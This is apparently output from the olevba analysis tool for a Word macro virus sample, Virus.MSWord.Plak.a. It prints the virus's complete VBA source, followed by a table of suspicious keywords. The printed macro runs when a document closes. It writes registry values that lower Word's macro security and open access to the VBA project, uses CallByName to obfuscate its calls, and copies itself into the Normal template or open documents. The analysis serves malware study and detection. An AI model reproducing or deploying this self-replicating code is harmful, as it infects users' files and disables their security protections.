olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Plak.a-7d1a2f4a9a31315ecc7e0d7d59dc9b6bb462d85c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Plak.a-7d1a2f4a9a31315ecc7e0d7d59dc9b6bb462d85c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_close()
Rem Word2007.P0lak (c)by Necronomikon[DCA]
Dim shell
Set shell = CreateObject(("WScript" + ".Shell"))
RegPath = "HKCU\Software\Microsoft\Office\12.0\Word\Security\"
shell.RegWrite RegPath & "Level", 1, "REG_DWORD"
shell.RegWrite RegPath & "AccessVBOM", 1, "REG_DWORD"
shell.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Options\DefaultFormat", "Doc97"
M = CallByName(VBE.ActiveCodePane.codemodule, "Lines", VbGet, 1, 17)
If CallByName(Application, "MacroContainer", VbGet) = NormalTemplate Then
Set k = ActiveDocument.VBProject.vbcomponents(1).codemodule
Else
Set k = NormalTemplate.VBProject.vbcomponents(1).codemodule
End If
CallByName k, "Deletelines", VbMethod, 1, CallByName(k, "Countoflines", VbGet)
CallByName k, "Addfromstring", VbMethod, M
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

